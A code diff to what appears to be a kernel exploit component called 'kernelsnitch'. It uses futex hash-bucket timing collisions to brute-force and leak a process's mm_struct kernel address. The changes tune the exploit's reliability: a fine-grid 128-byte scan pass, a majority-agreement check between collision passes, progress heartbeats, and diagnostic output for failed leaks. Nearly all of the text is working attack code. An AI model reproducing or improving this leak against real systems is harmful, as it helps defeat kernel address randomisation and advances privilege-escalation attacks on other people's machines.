@@ -96,9 +96,20 @@ namespace ghostlock::kernelsnitch {
         volatile size_t found;
         volatile size_t mm_struct;
         volatile size_t scan_done;
+        /* v11.4: mm brute-force pass heartbeat (current coarse address), so the
+         * parent wait loop can tell a running mm scan from a frozen collision
+         * scan — the 23:52 run had no way to see which phase was alive. */
+        volatile size_t mm_progress;
 
         pthread_t *tids;
         size_t identity_diff;
+
+        /* v12.1: brute-force forensics. cand_tested counts matcher calls
+         * (racy increments are fine — diagnostics, not control flow); the
+         * rest snapshot the geometry the scan actually used, so a 0-match
+         * run distinguishes "range empty", "candidate out of range", and
+         * "observed set is noise" without another panic. */
+        volatile size_t cand_tested;
 
         enum kernelsnitch_state state;
     };
@@ -218,9 +229,11 @@ namespace ghostlock::kernelsnitch {
         struct range range;
         int32_t try_canonical;
         int32_t sweep_tags;
+        int32_t fine_grid;
     };
 
     static int32_t __mm_candidate_matches(struct kernelsnitch_shared_state *ks, size_t candidate) {
+        ks->cand_tested++;
         for (size_t i = 1; i < ks->collisions; ++i) {
             if (futex_hash_context_bucket(&ks->futex_hash, ks->futex_addrs[0], candidate) !=
                 futex_hash_context_bucket(&ks->futex_hash, ks->futex_addrs[i], candidate))
@@ -248,7 +261,16 @@ namespace ghostlock::kernelsnitch {
          * warning in the build). MM_ORDER is small; the value is unchanged. */
         const size_t mm_slab_sz =
                 static_cast<size_t>(PAGE_SIZE) << ks->mm_slab_order;
+        /* v12.2: fine-grid pass. The mm_struct_sz (1280) stride from
+         * 32KB-stepped slab bases only covers 5 of the 160 possible 256-byte
+         * residue classes (32768 % 1280 = 768 shifts the grid every slab),
+         * so most true mm addresses fall between grid lines — the 10-03
+         * full-scan-no-match failures (161M candidates, zero hits, 0/25
+         * across boots). stride 128 covers every ≥128-aligned object;
+         * 20× the work, only used when the fast passes miss. */
+        const size_t cand_stride = mm_leak_arg->fine_grid ? 128 : ks->mm_struct_sz;
         for (size_t coarse_addr = range->start; (coarse_addr < range->end) && !ks->found; coarse_addr += COARSE_SZ) {
+            ks->mm_progress = coarse_addr;
             if ((coarse_addr % (1ULL << 40)) == 0)
                 if (ks->verbose)
                     pr_info("[% 3zd] [%016zx-%016llx]\n", range->id, coarse_addr,
@@ -257,7 +279,7 @@ namespace ghostlock::kernelsnitch {
             for (size_t slab_addr = coarse_addr; (slab_addr < slab_end) && !ks->found; slab_addr += mm_slab_sz) {
                 size_t slab_limit = ghostlock::kernelsnitch::scan_limit(slab_addr, mm_slab_sz, slab_end);
                 for (size_t mm_struct_candidate = slab_addr; (mm_struct_candidate < slab_limit) && !ks->found;
-                     mm_struct_candidate += ks->mm_struct_sz) {
+                     mm_struct_candidate += cand_stride) {
                     if (mm_leak_arg->try_canonical) {
                         size_t canonical_candidate = (mm_struct_candidate & ~(0xfULL << 56)) | (0xfULL << 56);
                         if (__mm_candidate_matches(ks, canonical_candidate)) {
@@ -284,7 +306,8 @@ namespace ghostlock::kernelsnitch {
         return 0;
     }
 
-    static void __run_mm_leak_pass(struct kernelsnitch_shared_state *ks, int32_t try_canonical, int32_t sweep_tags) {
+    static void __run_mm_leak_pass(struct kernelsnitch_shared_state *ks, int32_t try_canonical, int32_t sweep_tags,
+                                   int32_t fine_grid) {
         /* the leak check discards a match past the measured end, so no slice
      * scans past it */
         const size_t ceiling = std::min<uint64_t>(ghostlock::kernel::g_direct_map_end,
@@ -298,6 +321,7 @@ namespace ghostlock::kernelsnitch {
             mm_leak_arg->range.end = IDENTITY_START + ks->identity_diff * (i + 1);
             mm_leak_arg->try_canonical = try_canonical;
             mm_leak_arg->sweep_tags = sweep_tags;
+            mm_leak_arg->fine_grid = fine_grid;
             if ((mm_leak_arg->range.start % COARSE_SZ) != 0)
                 mm_leak_arg->range.start = (mm_leak_arg->range.start & ~(COARSE_SZ - 1));
             if ((mm_leak_arg->range.end % COARSE_SZ) != 0)
@@ -608,6 +632,66 @@ namespace ghostlock::kernelsnitch {
             pr_warning("fast pass found %zu/%zu collisions; retrying conservative\n", count, wanted);
             count = __collision_pass(ks, MEASURE_SLOW_REPEAT, MEASURE_SLOW_AVG, MEASURE_SLOW_REPEAT, MEASURE_SLOW_AVG);
         }
+        /* v11.4: one timing pass can admit a transient-noise collider. Such a
+         * poisoned set passes every later check and makes the mm brute-force
+         * fail across the whole direct map (no mm puts those addresses in one
+         * bucket), burning a ~10s scan plus the rest of the attempt — the
+         * 2026-10-02 23:12 run did that seven times. Require an independent
+         * second pass to find the SAME address set before accepting. */
+        if (wanted == count) {
+            size_t first[KERNELSNITCH_COLLISION_POOL];
+            for (size_t i = 0; i < count; ++i)
+                first[i] = static_cast<size_t>(ks->futex_addrs[1 + i]);
+            if (ks->verbose)
+                pr_info("re-scanning collisions for agreement\n");
+            size_t count2 = __collision_pass(ks, MEASURE_SLOW_REPEAT, MEASURE_SLOW_AVG, MEASURE_SLOW_REPEAT,
+                                             MEASURE_SLOW_AVG);
+            if (count2 != wanted) {
+                /* v11.5: 0-found is NOT a mismatch — the agreement pass's own
+                 * drain/re-pile prove can transiently measure zero colliders
+                 * on a busy system (2026-10-03 10:52 run: 7 consecutive
+                 * 0/3 discards, all with screen 4-6/3 passing seconds
+                 * earlier). futex_addrs[1..] still holds pass-1's set (a
+                 * 0-count pass writes nothing); keep it and let the mm
+                 * brute-force scan arbitrate — that scan is the ground
+                 * truth anyway and the streak guard bounds the cost of a
+                 * truly poisoned set. A nonzero set that disagrees IS a
+                 * mismatch: discard. */
+                if (count2 == 0) {
+                    if (ks->verbose)
+                        pr_info("agreement pass found nothing (churn); keeping pass-1 set\n");
+                } else {
+                    pr_warning("agreement pass found %zu/%zu collisions -> discard set\n",
+                               count2, wanted);
+                    count = 0;
+                }
+            } else {
+                size_t agree = 0;
+                for (size_t i = 0; i < wanted; ++i) {
+                    for (size_t j = 0; j < wanted; ++j) {
+                        if (first[i] == static_cast<size_t>(ks->futex_addrs[1 + j])) {
+                            agree++;
+                            break;
+                        }
+                    }
+                }
+                /* v12.15: 2/3 (majority) agreement is enough to keep the set;
+                 * only 0/3 or 1/3 (no majority) is discarded. SO-54C 2026-10-05:
+                 * pass-2 keeps finding 3 colliders but 1-2 addresses drift
+                 * between passes under degraded timing — "agreement 2/3" was the
+                 * weekday killer (run-1: W2 15/15 miss; run-2 attempt-1: 7/8).
+                 * The mm brute-force is the ground truth anyway and the streak
+                 * guard bounds the cost of a genuinely poisoned set (v11.5 note).
+                 */
+                if (agree < 2) {
+                    pr_warning("agreement %zu/%zu addresses matched -> discard set\n", agree, wanted);
+                    count = 0;
+                } else if (agree != wanted) {
+                    pr_warning("agreement %zu/%zu addresses matched; keeping set for mm arbitrate\n",
+                               agree, wanted);
+                }
+            }
+        }
         if (wanted == count) {
             if (ks->verbose) pr_info("found %zu collisions\n", count);
             ks->state = KERNELSNITCH_COLLISIONS_FOUND;
@@ -634,10 +718,36 @@ namespace ghostlock::kernelsnitch {
         if (ks->verbose) pr_info("start bruteforcing\n");
         ghostlock::kernel::reset_cpu_pin();
 
-        __run_mm_leak_pass(ks, 1, 0);
-        if (!ks->found)
-            __run_mm_leak_pass(ks, 0, 1);
+        ks->cand_tested = 0;
+        __run_mm_leak_pass(ks, 1, 0, 0);
+        if (!ks->found) {
+            ks->mm_progress = 0;
+            __run_mm_leak_pass(ks, 0, 1, 0);
+        }
+        if (!ks->found) {
+            /* v12.4: fine-grid last resort — 128-byte stride, canonical top
+             * byte ONLY. With the tag sweep this pass costs ~20 minutes
+             * (1.6B candidates × 15 tags), which wedged the 11:59 run past
+             * the kernelsnitch wait window; canonical-only is ~80s and
+             * covers every 0xf-canonical mm (the overwhelmingly common
+             * case). */
+            ks->mm_progress = 0;
+            __run_mm_leak_pass(ks, 1, 0, 1);
+        }
         ks->state = (ks->mm_struct == static_cast<size_t>(-1)) ? KERNELSNITCH_MM_NOT_FOUND : KERNELSNITCH_MM_FOUND;
+        if (ks->state == KERNELSNITCH_MM_NOT_FOUND) {
+            /* v12.1: one line that distinguishes the three failure classes —
+             * cand_tested==0 (range empty), full scan with no match
+             * (candidate out of range, or the observed set is timing noise),
+             * and the geometry the scan assumed. */
+            pr_info("ks diag: cand=%zu id_diff=%zx tbl=%zu coll=%zu "
+                    "a0=%zx a1=%zx a2=%zx mm_sz=%zx slab=%zu\n",
+                    ks->cand_tested, ks->identity_diff,
+                    ks->futex_hash_table_size, ks->collisions,
+                    ks->futex_addrs[0], ks->futex_addrs[1],
+                    ks->collisions > 2 ? ks->futex_addrs[2] : 0,
+                    ks->mm_struct_sz, (size_t) ks->mm_slab_order);
+        }
         return ks->state == KERNELSNITCH_MM_FOUND ? 0 : -1;
     }
 
